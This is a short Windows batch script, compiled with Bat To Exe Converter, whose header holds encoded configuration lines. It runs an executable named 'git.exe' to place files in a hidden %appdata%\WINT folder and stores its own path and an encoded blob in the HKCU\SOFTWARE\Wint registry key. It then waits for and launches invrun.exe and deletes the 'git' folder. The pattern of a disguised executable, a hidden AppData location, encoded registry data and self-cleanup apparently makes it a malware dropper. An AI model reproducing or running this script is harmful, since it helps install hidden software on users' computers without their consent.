::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAnk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSzk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFBhbQheWAES0A5EO4f7+086CsUYJW/IDb4bVmqCcL/kv2ED3eoM/1X9JpJpCCQNdHg==
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
cd git
git.exe %appdata%/WINT\
reg.exe ADD HKEY_CURRENT_USER\SOFTWARE\Wint /v inst /t REG_SZ /d %~0 /f
reg.exe ADD HKEY_CURRENT_USER\SOFTWARE\Wint /v dcbt /t REG_SZ /d UZTIsCfcDYlqwRKt7H/6zh03KaecoThXzapoCYm7geMHNMjE0YjL0XfSzIlZzu53V0LYYxVXgXF+S1XbKwgniEg5tj70tejhwUF+EPAgre4= /f
:loop
if exist %appdata%/WINT\invrun.exe (
    start %appdata%/WINT\invrun.exe
) else (
    goto loop
)
cd..
rmdir /s /q git
